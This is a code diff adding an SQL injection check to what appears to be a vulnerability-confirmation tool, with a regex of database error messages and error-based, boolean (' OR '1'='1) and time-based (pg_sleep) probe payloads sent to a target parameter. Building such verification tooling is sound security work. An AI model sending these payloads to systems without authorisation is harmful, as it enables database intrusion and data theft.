@@ -11,6 +11,11 @@ from urllib.parse import urlencode
 from tools.httpx import Session, save_evidence
 
 _PASSWD = re.compile(r"root:.*:0:0:")
+SQL_ERROR_RE = re.compile(
+    r"SQL syntax|SQLSTATE|unterminated quoted|quoted string not properly terminated|"
+    r"unclosed quotation mark|ORA-\d|SQLITE_ERROR|sqlite3\.|psql:|PG::|"
+    r"You have an error in your SQL|Microsoft OLE DB|ODBC SQL Server|"
+    r'near "[^"]*": syntax error', re.I)
 
 
 @dataclass
@@ -248,4 +253,51 @@ def check_unauth_access(session, hyp, ev_dir, ctx):
         return CheckResult("confirmed", endpoint, "high", f"GET {endpoint} with no session",
                            "Privileged endpoint served content to an unauthenticated request "
                            "(no login or authorization enforced).", files=files)
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("SQLI", "SQL-INJECTION")
+def check_sqli(session, hyp, ev_dir, ctx):
+    endpoint, param = hyp["endpoint"], hyp["parameter"]
+    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
+    benign = str(hyp.get("benign", "1"))
+
+    control = send(benign)
+    files = save_evidence(ev_dir, "control", control)
+    control_err = bool(SQL_ERROR_RE.search(control.body))
+
+    err = send(benign + "'")
+    files += save_evidence(ev_dir, "error-probe", err)
+    if SQL_ERROR_RE.search(err.body) and not control_err:
+        return CheckResult("confirmed", endpoint, "high", f"{param}={benign}'",
+                           "A single quote triggered a database error absent from the benign "
+                           "control (error-based SQL injection).", files=files)
+
+    t = send(benign + "' OR '1'='1")
+    f = send(benign + "' AND '1'='2")
+    files += save_evidence(ev_dir, "boolean-true", t)
+    files += save_evidence(ev_dir, "boolean-false", f)
+    if t.status == 200 and f.status == 200 and t.body != f.body and len(t.body) > len(f.body):
+        return CheckResult("confirmed", endpoint, "high",
+                           f"{param}={benign}' OR '1'='1 (vs ' AND '1'='2)",
+                           "An always-true condition returned more data than an always-false "
+                           "one (boolean-based SQL injection).", files=files)
+
+    delay = int(hyp.get("sqli_delay", 2))
+    d1 = send(benign + f"' OR pg_sleep({delay})--")
+    d2 = send(benign + f"' OR pg_sleep({delay})--")
+    files += save_evidence(ev_dir, "time-inject", d1)
+    threshold = delay * 0.6
+    if d1.elapsed - control.elapsed >= threshold and d2.elapsed - control.elapsed >= threshold:
+        return CheckResult("confirmed", endpoint, "high",
+                           f"{param}={benign}' OR pg_sleep({delay})--",
+                           f"Injected pg_sleep({delay}) delayed the response ~{delay}s vs "
+                           f"control, reproduced twice (time-based blind SQL injection).",
+                           files=files)
+
+    if not SQL_ERROR_RE.search(err.body) and t.body == f.body:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="single quote caused no error and boolean "
+                                                 "payloads returned identical results "
+                                                 "(input appears parameterized)")
     return CheckResult("unconfirmed", endpoint, files=files)
